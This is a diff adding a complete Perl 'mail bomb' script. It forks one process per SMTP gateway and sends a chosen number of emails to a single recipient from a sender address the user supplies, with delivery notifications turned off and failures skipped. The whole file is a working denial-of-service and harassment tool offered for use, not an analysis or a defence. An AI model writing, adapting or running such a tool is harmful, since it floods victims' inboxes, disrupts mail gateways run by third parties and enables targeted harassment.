@@ -1,0 +1,75 @@
+#!/usr/bin/perl
+
+
+### INCLUDES
+use strict;
+use Getopt::Long;
+use IO::Socket::INET;
+use Net::SMTP;
+use feature 'say';
+use POSIX qw/WNOHANG/;
+
+
+### GLOBALS
+my ($to, $from, $count, $subject);
+
+
+### SUBROUTINE DECLARATIONS
+sub main;
+sub usage;
+sub mbomb;
+
+
+### MAIN FUNCTION
+main;
+
+
+### SUBROUTINE DEFINITIONS
+sub main {
+  GetOptions ("to=s" => \$to, "from=s" => \$from, "count=i" => \$count, "subject=s" => \$subject);
+  usage and exit unless $to and $from and $subject and $count > 0 and @ARGV > 0;
+
+  $SIG{CHLD} = 'IGNORE';
+
+  my %kids;
+  for my $gateway (@ARGV) {
+    my $pid = fork;
+    $pid < 0 and die "fork failed: $!";
+    if ($pid == 0) {  # child
+      say "mail bombing $gateway ($count emails)";
+      mbomb $gateway;
+      exit 0;
+    }
+    $kids{$pid};  # parent
+  }
+
+  while (keys %kids) {
+    if (my $kid = waitpid(-1, WNOHANG) > 0) {
+      delete $kids{$kid};
+    }
+  }
+
+  exit;
+}
+
+
+sub mbomb {
+  my $gateway = shift;
+
+  my $counter = $count;
+  while ($counter-- > 0) {
+    my $smtp = Net::SMTP->new($gateway) or next;
+    $smtp->mail($from) or next;
+    $smtp->recipient($to, { Notify => ['NEVER'], SkipBad => 1 }) or next;
+    $smtp->data("Subject: $subject\n\n$subject\n") or next;
+    $smtp->quit or next;
+  }
+
+  return 1;
+}
+    
+
+sub usage {
+  say "usage: $0 --to=<recipient address> --from=<sender address> --count=<number of emails> --subject=<subject line> gateway ...";
+  say "usage: $0 -t <recipient address> -f <sender address> -c <number of emails> -s <subject line> gateway ...";
+}
